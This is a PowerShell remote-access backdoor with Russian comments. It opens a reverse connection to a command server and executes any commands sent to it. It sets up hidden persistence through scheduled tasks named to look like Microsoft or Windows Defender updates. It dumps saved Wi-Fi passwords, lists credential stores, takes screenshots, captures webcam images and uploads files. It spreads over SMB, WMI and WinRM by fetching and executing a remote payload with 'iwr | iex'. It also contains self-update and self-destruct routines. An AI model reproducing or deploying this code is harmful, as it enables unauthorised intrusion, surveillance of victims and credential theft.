cmd /c "chcp 65001" | Out-Null
function Output-Log {
    param (
        [string]$message
    )
    # Выводим на локальную консоль
    Write-Host $message
    # Если активен клиентский поток, отправляем сообщение туда
    if ($global:clientStream -and $global:clientStream.CanWrite) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($message + "`n")
        try {
            $global:clientStream.Write($bytes, 0, $bytes.Length)
            $global:clientStream.Flush()
        }
        catch {
            # При ошибке очистим переменную
            $global:clientStream = $null
        }
    }
}


function Download-Ffmpeg {
    param (
        [string]$ffmpegUrl = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
    )
    try {
        $ffmpegZip = "$env:TEMP\ffmpeg.zip"
        $extractPath = "$env:TEMP\ffmpeg_extracted"
        
        # Если в каталоге уже есть ffmpeg.exe, возвращаем его путь
        $existingFfmpeg = Get-ChildItem -Path $extractPath -Recurse -Filter "ffmpeg.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($existingFfmpeg) {
            Output-Log "[+] ffmpeg already downloaded and extracted at: $($existingFfmpeg.FullName)"
            $global:ffmpegPath = $existingFfmpeg.FullName
            return "[+] ffmpeg downloaded and extracted successfully to: $($existingFfmpeg.FullName)"
        }
        
        Output-Log "[*] Starting download of ffmpeg from $ffmpegUrl..."
        Invoke-WebRequest -Uri $ffmpegUrl -OutFile $ffmpegZip -UseBasicParsing -Verbose
        Output-Log "[*] Download complete. File saved to: $ffmpegZip"
        
        if (-not (Test-Path $ffmpegZip)) {
            Output-Log "[ERROR] Downloaded zip file not found."
            return "[ERROR] Downloaded zip file not found."
        }
        
        Output-Log "[*] Extracting ffmpeg..."
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        if (Test-Path $extractPath) { 
            Remove-Item -Recurse -Force $extractPath 
        }
        New-Item -ItemType Directory -Path $extractPath | Out-Null
        [System.IO.Compression.ZipFile]::ExtractToDirectory($ffmpegZip, $extractPath)
        
        # Разблокируем извлечённые файлы
        Get-ChildItem -Path $extractPath -Recurse | Unblock-File -ErrorAction SilentlyContinue
        
        Output-Log "[*] Extraction complete. Extracted to: $extractPath"
        
        # Рекурсивно ищем ffmpeg.exe
        $ffmpegFile = Get-ChildItem -Path $extractPath -Recurse -Filter "ffmpeg.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($ffmpegFile) {
            Output-Log "[+] ffmpeg downloaded and extracted successfully to: $($ffmpegFile.FullName)"
            $global:ffmpegPath = $ffmpegFile.FullName
            return "[+] ffmpeg downloaded and extracted successfully to: $($ffmpegFile.FullName)"
        }
        else {
            Output-Log "[ERROR] ffmpeg.exe not found after extraction."
            return "[ERROR] ffmpeg.exe not found after extraction."
        }
    }
    catch {
        Output-Log "[ERROR] Failed to download/extract ffmpeg: $($_.Exception.Message)"
        return "[ERROR] Failed to download/extract ffmpeg: $($_.Exception.Message)"
    }
}





function Connect-ZiPo {
    $srv = "192.168.50.228"
    $port = 6666
    $currentDir = Get-Location


    function Get-AliveHosts {
    param (
        [System.Net.Sockets.NetworkStream]$stream
    )

    $sw = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
    $sw.AutoFlush = $true

    function Is-Alive {
        param ([string]$ip)
        try {
            $ping = New-Object System.Net.NetworkInformation.Ping
            $reply = $ping.Send($ip, 500)
            return $reply.Status -eq "Success"
        } catch {
            return $false
        }
    }

    try {
        # Получаем ВСЕ интерфейсы с IPv4
        $interfaces = Get-NetIPConfiguration | Where-Object { $_.IPv4Address -ne $null }
        $aliveHosts = @()

        foreach ($iface in $interfaces) {
            $ip = $iface.IPv4Address.IPAddress
            $prefix = $iface.IPv4Address.PrefixLength

            if ($prefix -lt 24) {
                $sw.WriteLine("[*] Skipping $ip/$prefix (too wide range)")
                continue
            }

            # Получаем базу подсети (например, 192.168.0.)
            $base = $ip -replace '\.\d+$', '.'
            $sw.WriteLine("[*] Scanning subnet $base0/24 from interface $ip ...")

            foreach ($i in 1..254) {
                $targetIP = "$base$i"
                if ($targetIP -eq $ip) { continue }  # Пропускаем свой IP

                if (Is-Alive $targetIP) {
                    $sw.WriteLine("[+] $targetIP is alive")
                    $aliveHosts += $targetIP
                } else {
                    $sw.WriteLine("[ ] $targetIP is offline")
                }
            }
        }

        $sw.WriteLine("")
        $sw.WriteLine("Alive hosts:")
        foreach ($aliveIP in $aliveHosts) {
            $sw.WriteLine($aliveIP)
        }
    }
    catch {
        $sw.WriteLine("[ERROR] scanHosts failed: $($_.Exception.Message)")
    }
}

    function Invoke-AutoSpread {
    param (
        [System.Net.Sockets.NetworkStream]$stream
    )

    $sw = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
    $sw.AutoFlush = $true

    $sw.WriteLine("[*] Starting auto-spread...")

    # Получаем IP текущей машины
    $myIP = (Get-NetIPAddress -AddressFamily IPv4 |
        Where-Object { $_.IPAddress -match '^192\.168\.' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
    $subnet = ($myIP -replace '\.\d+$', '.')

    $alive = @()

    # Сканируем подсеть
    foreach ($i in 1..254) {
        $ip = "$subnet$i"
        if ($ip -ne $myIP) {
            try {
                $ping = New-Object System.Net.NetworkInformation.Ping
                if ($ping.Send($ip, 200).Status -eq "Success") {
                    $sw.WriteLine("[+] Host alive: $ip")
                    $alive += $ip
                }
            } catch {}
        }
    }

    # Пробуем сделать spread на каждый IP с открытым C$
    foreach ($ip in $alive) {
        $cpath = "\\$ip\C$\Users\Public"
        if (Test-Path $cpath) {
            $sw.WriteLine("[*] Spreading to $ip...")
            try {
                $result = Spread-Backdoor -targetIP $ip
                $sw.WriteLine($result)
            } catch {
                $sw.WriteLine("[ERROR] Failed to spread to $($ip): $($_.Exception.Message)")
            }
        } else {
            $sw.WriteLine("[ ] No access to $ip C$")
        }
    }

    $sw.WriteLine("[*] Auto-spread complete.")
}



function Spread-WMI {
    param (
        [string]$targetIP,
        [string]$payloadURL = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1",
        [string]$username,
        [string]$password
    )

    try {
        $secure = ConvertTo-SecureString $password -AsPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential ($username, $secure)

        $command = "powershell -nop -w hidden -c `"iwr '$payloadURL' -UseBasicParsing | iex`""

        Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName $targetIP -Credential $cred -ArgumentList $command

        return "[+] WMI spread success to $targetIP"
    }
    catch {
        return "[ERROR] WMI spread failed: $($_.Exception.Message)"
    }
}

function Spread-WinRM {
    param (
        [string]$targetIP,
        [string]$payloadURL = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1",
        [string]$username,
        [string]$password
    )

    try {
        $secure = ConvertTo-SecureString $password -AsPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential ($username, $secure)

        Invoke-Command -ComputerName $targetIP -Credential $cred -ScriptBlock {
            iwr "$using:payloadURL" -UseBasicParsing | iex
        }

        return "[+] WinRM spread success to $targetIP"
    }
    catch {
        return "[ERROR] WinRM spread failed: $($_.Exception.Message)"
    }
}



function PortSuggest {
    param (
        [string]$ip,
        [int[]]$ports
    )

    $suggestions = @()

    foreach ($port in $ports) {
        switch ($port) {
            445     { $suggestions += "[+] $($ip):$($port) -> SMB detected -> Try: spread, pass-the-hash, PsExec" }
            5985    { $suggestions += "[+] $($ip):$($port) -> WinRM detected -> Try: Spread-WinRM" }
            135     { $suggestions += "[+] $($ip):$($port) -> WMI RPC -> Try: Spread-WMI" }
            3389    { $suggestions += "[+] $($ip):$($port) -> RDP -> Try: brute, keylog, GUI session" }
            80      { $suggestions += "[+] $($ip):$($port) -> Web Server -> Check: web panel, upload point" }
            443     { $suggestions += "[+] $($ip):$($port) -> HTTPS -> Try: SSL scan, potential login" }
            21      { $suggestions += "[+] $($ip):$($port) -> FTP -> Try: anonymous login, upload test" }
            3306    { $suggestions += "[+] $($ip):$($port) -> MySQL -> Try: default creds, sql dump" }
            default { $suggestions += "[-] $($ip):$($port) -> Unknown or uncommon port, scan manually" }
        }
    }

    return $suggestions -join "`n"
}






    function Test-Ports {
    param (
        [string]$ip,
        [int[]]$ports = @(21,22,23,25,53,80,110,135,139,143,443,445,3306,3389,5985),
        [int]$timeout = 100
    )

    $openPorts = @()
    Output-Log "[*] Starting port scan on $ip with timeout $timeout ms..."

    foreach ($port in $ports) {
        try {
            $client = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $client.BeginConnect($ip, $port, $null, $null)
            $connected = $asyncResult.AsyncWaitHandle.WaitOne($timeout, $false)
            $client.Close()

            if ($connected) {
                Output-Log "[OPEN] $($ip):$($port)"
                $openPorts += $port
            } else {
                Output-Log "[CLOSED] $($ip):$($port)"
            }
        }
        catch {
            Output-Log "[ERROR] $($ip):$($port) $($_.Exception.Message)"
        }
    }

    Output-Log "[*] Port scan completed for $ip."

    if ($openPorts.Count -gt 0) {
    Output-Log "`n[*] PortSuggest for $($ip):"
    PortSuggest -ip $ip -ports $openPorts | ForEach-Object {
        Output-Log $_
    }
    } else {
        Output-Log "[*] No open ports found. No suggestions available."
    }

    return ""
}







    function Spread-Backdoor {
    param($targetIP)

    $remotePath = "\\$targetIP\C$\Users\Public\update.ps1"
    $payloadURL = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1"
    Invoke-WebRequest -Uri $payloadURL -OutFile $remotePath

    $cmd = "schtasks /Create /S $targetIP /RU SYSTEM /SC ONSTART /TN WinUpdate /TR 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\update.ps1' /F"
    Invoke-Expression $cmd
}






    function Upload-File($path) {
        if (Test-Path $path) {
            $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
            return "[UPLOAD]::$(Split-Path $path -Leaf)::" + $b64 + "::END"
        } else {
            return "[ERROR]::FILE NOT FOUND: $path"
        }
    }

   function Add-Persistence {
    try {
        $folder = "$env:APPDATA\WindowsDefender"
        if (-not (Test-Path $folder)) {
            New-Item -ItemType Directory -Path $folder -Force | Out-Null
        }

        $targetPath = Join-Path $folder "MicrosoftUpdate.ps1"
        $url = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1"
        Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $targetPath

        $taskName = "MicrosoftEdgeUpdateChecker"

        schtasks /Query /TN $taskName 2>$null
        if ($LASTEXITCODE -ne 0) {
            schtasks /Create /TN $taskName /SC ONLOGON `
                /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" `
                /RL HIGHEST /F | Out-Null
        }

        return "[+] Persistence established successfully!"
    }
    catch {
        return "[ERROR] Persistence failed: $($_.Exception.Message)"
    }
}




    function Download-File($filename, $b64) {
        $out = "$env:TEMP\$filename"
        [IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($b64))
        return "[DOWNLOADED] $out"
    }

    function Get-Credentials {
    try {
        $output = ""

        # 1. Windows Credential Manager (generic credentials)
        $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
            $target = $_.ToString().Split(":")[1].Trim()
            $output += "`n[TARGET] $target"
        }

        # 2. Chrome saved logins (мета-данные — без дешифровки)
        $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        if (Test-Path $chromeLoginPath) {
            $output += "`n[+] Chrome login database found: $chromeLoginPath"
        }

        # 3. Firefox профили (только список профилей)
        $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
        foreach ($profile in $firefoxProfiles) {
            $output += "`n[+] Firefox profile: $($profile.FullName)"
        }

        if ([string]::IsNullOrWhiteSpace($output)) {
            return "[INFO] No credentials found or access denied."
        }

        return $output
    }
    catch {
        return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
    }
}
    
    function Dump-WiFi {
    netsh wlan show profiles | ForEach-Object {
        if ($_ -match "All User Profile\s*:\s*(.*)") {
            $profile = $matches[1].Trim()
            $key = (netsh wlan show profile name="$profile" key=clear |
                    Select-String "Key Content\s*:\s*(.*)") |
                    ForEach-Object { $_.ToString().Split(":")[1].Trim() }
            "$profile :: $key"
        }
    } | Out-String
}

    function Take-Screenshot {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,
                                         [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
        $graphics = [Drawing.Graphics]::FromImage($bmp)
        $graphics.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
        $path = "$env:TEMP\snap.png"
        $bmp.Save($path, [Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bmp.Dispose()
        return Upload-File $path
    }

   function Capture-Webcam {
    try {
        # Попытка захвата через WIA
        $manager = New-Object -ComObject WIA.DeviceManager
        foreach ($deviceInfo in $manager.DeviceInfos) {
            try {
                $dev = $deviceInfo.Connect()
                $img = $dev.Items.Item(1).Transfer()
                $file = "$env:TEMP\webcam_$($deviceInfo.Properties[1].Value).jpg"
                $img.SaveFile($file)
                $uploadResult = Upload-File $file
                Remove-Item $file -Force -ErrorAction SilentlyContinue
                Output-Log "[*] Image captured via WIA and sent to client."
                return $uploadResult
            }
            catch {
                continue
            }
        }
        
        # Если WIA не обнаружила камеру, пробуем использовать ffmpeg
        if (-not $global:ffmpegPath -or -not (Test-Path $global:ffmpegPath)) {
            $ffmpegPath = "ffmpeg"
            Output-Log "[*] No camera found via WIA. Checking ffmpeg in PATH..."
            $ffmpegCheck = & cmd /c "$ffmpegPath -version" 2>$null
            if ($LASTEXITCODE -ne 0) {
                Output-Log "[*] ffmpeg not found in PATH. Attempting to download ffmpeg..."
                $downloadResult = Download-Ffmpeg
                Output-Log $downloadResult
                if ($downloadResult -match "^\[\+\]") {
                    $global:ffmpegPath = ($downloadResult -replace "^\[\+\].+to:\s+","").Trim()
                }
                else {
                    return "[ERROR] Unable to download ffmpeg."
                }
            }
            else {
                $global:ffmpegPath = $ffmpegPath
            }
        }
        
        Output-Log "[*] Using ffmpeg at: $global:ffmpegPath"
        $tempImage = "$env:TEMP\webcam_ffmpeg.jpg"
        $ffmpegExec = $global:ffmpegPath
        
        # Получаем список устройств через ffmpeg
        $cameraOutput = & cmd /c "`"$ffmpegExec`" -list_devices true -f dshow -i dummy" 2>&1
        Output-Log "[*] ffmpeg device list:"
        Output-Log $cameraOutput
        
        # Ищем имя камеры из строк, содержащих "(video)"
        $cameraName = $null
        $cameraLines = $cameraOutput | Select-String "(video)"
        if ($cameraLines) {
            foreach ($line in $cameraLines) {
                if ($line.ToString() -match '"([^"]+)"\s*\(video\)') {
                    $cameraName = $Matches[1]
                    break
                }
                elseif ($line.ToString() -match 'video="?([^"]+)"?\s*\(video\)') {
                    $cameraName = $Matches[1]
                    break
                }
            }
        }
        
        if (-not $cameraName -or [string]::IsNullOrWhiteSpace($cameraName)) {
            return "[ERROR] ffmpeg fallback did not detect any camera."
        }
        
        Output-Log "[*] Camera detected: $cameraName. Capturing image..."
        Start-Process -FilePath $ffmpegExec -ArgumentList "-f dshow -i video=`"$cameraName`" -frames:v 1 `"$tempImage`"" -NoNewWindow -Wait
        if (Test-Path $tempImage) {
            Output-Log "[*] Image captured successfully via ffmpeg."
            $uploadResult = Upload-File $tempImage
            Remove-Item $tempImage -Force -ErrorAction SilentlyContinue
            return $uploadResult
        }
        else {
            return "[ERROR] Failed to capture image using ffmpeg."
        }
    }
    catch {
        return "[ERROR] Webcam capture failed: $($_.Exception.Message)"
    }
}













    function Tree-List {
    try {
        return Get-ChildItem -Path $currentDir -Recurse -ErrorAction SilentlyContinue |
               Where-Object { $_.FullName -notmatch '\\Windows\\|\\Program Files' } |
               Select-Object FullName |
               Out-String
    }
    catch {
        return "[ERROR] $($_.Exception.Message)"
    }
}
 

function Update-Self {
    param (
        [string]$url = "https://raw.githubusercontent.com/zipo0/studytime-/main/client.ps1",
        [string]$localPath = "$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1"
    )

    try {
        Invoke-WebRequest -Uri $url -OutFile $localPath -UseBasicParsing
        Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPath`""
        Start-Sleep -Seconds 1
        Stop-Process -Id $PID -Force
    }
    catch {
        return "[ERROR] Update failed: $($_.Exception.Message)"
    }
}



    function Self-Destruct {
    try {
        $scriptPath = $MyInvocation.MyCommand.Path
        if (-not $scriptPath) {
            $scriptPath = "$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1"
        }

        $cleanupBat = "$env:APPDATA\WindowsDefender\cleanup.bat"
        $taskName = "MicrosoftEdgeUpdateChecker"
        $cleanupTask = "ZiPo_Cleanup"

        $batContent = @"
@echo off
timeout /t 5 >nul
del "$scriptPath" /f /q
schtasks /Delete /TN "$taskName" /F >nul 2>&1
del "%~f0" /f /q
schtasks /Delete /TN "$cleanupTask" /F >nul 2>&1
"@

        $batContent | Set-Content -Path $cleanupBat -Encoding ASCII

        schtasks /Create /TN $cleanupTask /SC ONCE /TR "`"$cleanupBat`"" `
            /ST ((Get-Date).AddMinutes(1).ToString("HH:mm")) /RL HIGHEST /F | Out-Null

        Start-Sleep -Seconds 1
        Stop-Process -Id $PID -Force
    }
    catch {
        return "[ERROR] Self-destruct failed: $($_.Exception.Message)"
    }
}






    Add-Persistence
    while ($true) {
        try {
            $tcp = [Net.Sockets.TcpClient]::new($srv, $port)
            $stream = $tcp.GetStream()

            $global:clientStream = $stream
            
            [byte[]]$buffer = 0..65535 | % { 0 }

            $esc = [char]27
            $clear = "$esc[2J$esc[H"
            $banner = @"
${esc}[31m
   ________ _______  ________  ________
  |\  _____\\  ___ \|\   __  \|\   ____\
  \ \  \__/ \ \   __<\ \  \|\  \ \  \___|
   \ \   __\ \ \  \_|\ \ \   __  \ \  \   
    \ \  \_|  \ \  \_|\ \ \  \ \  \ \  \____
     \ \__\    \ \_______\ \__\ \__\ \_______\
      \|__|     \|_______|\|__|\|__|\|_______|
                BALLS
${esc}[0m

${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
OS: $([System.Environment]::OSVersion.VersionString)
Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
------------------------------------------------------------
"@

            $intro = $clear + $banner + "`nPS $currentDir> "
            $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
            $stream.Write($bbytes, 0, $bbytes.Length)
            $stream.Flush()

            while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                $cmd = ([Text.Encoding]::UTF8).GetString($buffer, 0, $i).Trim()

                try {
                    if ([string]::IsNullOrWhiteSpace($cmd)) {
                        $response = ""
                    }
                    elseif ($cmd.StartsWith("!get")) {
                        $path = $cmd.Substring(4).Trim()
                        if ([string]::IsNullOrWhiteSpace($path)) {
                            $response = "[ERROR] Usage: !get <full_path_to_file>"
                        } else {
                            $response = Upload-File $path
                        }
                    }
                    elseif ($cmd.StartsWith("!post")) {
                        $parts = $cmd.Split("::")
                        if ($parts.Length -eq 3) {
                            $response = Download-File $parts[1].Trim() $parts[2].Trim()
                        } else {
                            $response = "[ERROR] INVALID POST FORMAT"
                        }
                    }
                    elseif ($cmd -like "cd *") {
                        $target = $cmd.Substring(3).Trim()
                        Set-Location -Path $target
                        $currentDir = Get-Location
                        $response = ""
                    }
                    elseif ($cmd -eq "!sysinfo") {
                        $response = Get-ComputerInfo | Out-String
                    }
                    elseif ($cmd -eq "!sc") {
                        $response = Take-Screenshot
                    }
                    elseif ($cmd -eq "!webcam") {
                        $response = Capture-Webcam
                    }
                    elseif ($cmd -eq "!wifi") {
                        $response = Dump-WiFi
                    }
                    elseif ($cmd -eq "!tree") {
                        $response = Tree-List
                    }
                    elseif ($cmd -eq "!creds") {
                        $response = Get-Credentials
                    }
                    elseif ($cmd -eq "scanHosts") {
                        Get-AliveHosts -stream $stream
                        $response = ""
                    }
                   elseif ($cmd -eq "!upd") {
                        $response = Update-Self
                    }
                    elseif ($cmd -eq "!autospread") {
                        Invoke-AutoSpread -stream $stream
                        $response = ""
                    }
                    elseif ($cmd.StartsWith("spread")) {
                        $args = $cmd.Split(" ")
                        if ($args.Length -eq 2) {
                            $target = $args[1]
                            $response = Spread-Backdoor -targetIP $target
                        } else {
                            $response = "[USAGE] spread <targetIP>"
                        }
                    }
                    elseif ($cmd.StartsWith("portFuzz")) {
                        $args = $cmd.Split(" ")
                        if ($args.Length -eq 2) {
                            $ip = $args[1]
                            Test-Ports -ip $ip  # сканирует 1..65535
                            $response = ""
                        }
                        
                        elseif ($args.Length -eq 3) {
                            $ip = $args[1]
                            $port = [int]$args[2]
                            Test-Ports -ip $ip -ports @($port)
                            $response = ""
                        }
                        else {
                            $response = "[USAGE] portFuzz <ip> [port]"
                        }
                    
                        if ($response) {
                            Output-Log $response
                        }
                    }
                    elseif ($cmd.StartsWith("spread-wmi")) {
                        $args = $cmd.Split(" ")
                        if ($args.Length -eq 4) {
                            $response = Spread-WMI -targetIP $args[1] -username $args[2] -password $args[3]
                        } else {
                            $response = "[USAGE] spread-wmi <ip> <username> <password>"
                        }
                    }
                    elseif ($cmd.StartsWith("spread-winrm")) {
                        $args = $cmd.Split(" ")
                        if ($args.Length -eq 4) {
                            $response = Spread-WinRM -targetIP $args[1] -username $args[2] -password $args[3]
                        } else {
                            $response = "[USAGE] spread-winrm <ip> <username> <password>"
                        }
                    }
                    elseif ($cmd.StartsWith("portsuggest")) {
                        $args = $cmd.Split(" ")
                        if ($args.Length -ge 3) {
                            $ip = $args[1]
                            $ports = $args[2..($args.Length - 1)] | ForEach-Object { [int]$_ }
                            $response = PortSuggest -ip $ip -ports $ports
                        } else {
                            $response = "[USAGE] portsuggest <ip> <port1> <port2> ..."
                        }
                    }

                    elseif ($cmd -eq "!die") {
                        $response = "[!] Self-destruct initiated..."
                        $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                        $stream.Write($outBytes, 0, $outBytes.Length)
                        $stream.Flush()
                        Self-Destruct
                    }
                    else {
                        $sb = [ScriptBlock]::Create("cd '$currentDir'; $cmd")
                        $output = & $sb 2>&1 | Out-String
                        $response = $output.TrimEnd()
                    }
                }
                catch {
                    $response = "[ERROR] $($_.Exception.Message.ToUpper())"
                }

                # Обновлённое добавление приглашения:
                $response = ($response.TrimEnd() + "`nnPS $currentDir> ")

                $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                $stream.Write($outBytes, 0, $outBytes.Length)
                $stream.Flush()
            }

            $stream.Close()
            $tcp.Close()
        }
        catch {
            Start-Sleep -Seconds 5
        }
    }
}

Connect-ZiPo
